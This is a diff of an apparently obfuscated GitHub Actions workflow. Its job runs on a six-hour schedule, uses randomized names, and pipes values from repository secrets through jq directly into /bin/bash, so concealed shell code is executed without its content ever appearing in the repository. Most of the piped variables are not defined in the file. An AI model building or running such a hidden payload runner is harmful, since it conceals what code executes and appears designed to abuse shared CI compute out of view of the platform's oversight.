@@ -1,22 +1,26 @@
 name: luorenzong1098
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 2/6 * * *'
+    - cron: '4 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luorenzong1098
         env:
-          fdzkm7083: ${{ secrets.fdzkm7083 }}
+          u9: ${{ secrets.u9 }}
         run: |
-          echo $fdzkm7083 | jq -r .gun503 | /bin/bash
-          echo $o621 | jq -r .s999 | /bin/bash
-          echo $r999 | jq -r .a3 | /bin/bash
-          echo $o63148 | jq -r .zvzr67 | /bin/bash
-          echo $y477 | jq -r .kc37 | /bin/bash
-          echo $amg60701 | jq -r .cxgb4232 | /bin/bash
+          echo $u9 | jq -r .abad2 | /bin/bash
+          echo $a4778 | jq -r .lyawl860 | /bin/bash
+          echo $ddfz24 | jq -r .o533 | /bin/bash
+          echo $qxkg160 | jq -r .rj8663 | /bin/bash
+          echo $psmgs20341 | jq -r .ja5 | /bin/bash
+          echo $c5375 | jq -r .gn3316 | /bin/bash
+          echo $vu76 | jq -r .suzyw53934 | /bin/bash
+          echo $fw412 | jq -r .oamq56 | /bin/bash
+          echo $zqj3266 | jq -r .rnwkc9784 | /bin/bash
 
